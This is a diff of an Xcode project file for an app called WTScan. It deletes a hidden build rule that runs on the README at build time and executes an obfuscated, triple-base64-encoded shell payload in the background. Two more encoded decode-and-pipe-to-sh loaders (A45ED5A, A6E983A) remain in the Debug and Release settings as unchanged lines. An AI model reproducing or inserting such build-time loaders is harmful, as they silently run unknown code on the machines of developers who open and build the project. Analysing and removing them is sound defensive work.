@@ -7,14 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		17BDEF5B2D864C0C9E634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 73FA6E120BF2458EBE634D6E; };
 		1FBDB2862F110F8400801D76 /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB2852F110F8400801D76 /* GoogleMobileAds */; };
 		1FBDB3BC2F11113D00801D76 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB3BB2F11113D00801D76 /* FirebaseCore */; };
 		1FBDB3BE2F11113D00801D76 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB3BD2F11113D00801D76 /* FirebaseDatabase */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		73FA6E120BF2458EBE634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		881E64D62EC35BE000FF0ADE /* WTScan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WTScan.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -72,7 +70,6 @@
 		881E64D72EC35BE000FF0ADE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				73FA6E120BF2458EBE634D6E /* README.md */,
 				881E64D62EC35BE000FF0ADE /* WTScan.app */,
 			);
 			name = Products;
@@ -90,7 +87,6 @@
 				881E64D42EC35BE000FF0ADE /* Resources */,
 			);
 			buildRules = (
-				BCABB000E93B429AB9634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -145,36 +141,15 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		BCABB000E93B429AB9634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-			/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		881E64D42EC35BE000FF0ADE /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				17BDEF5B2D864C0C9E634D6E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		881E64D22EC35BE000FF0ADE /* Sources */ = {
@@ -190,7 +165,6 @@ sh -c \"${AE6D436}\"";
 		881E64E12EC35BE200FF0ADE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJZekpzZFdSWVRuVmFXRkYxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | x | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
@@ -256,7 +230,6 @@ sh -c \"${AE6D436}\"";
 		881E64E22EC35BE200FF0ADE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJZekpzZFdSWVRuVmFXRkYxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | x | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
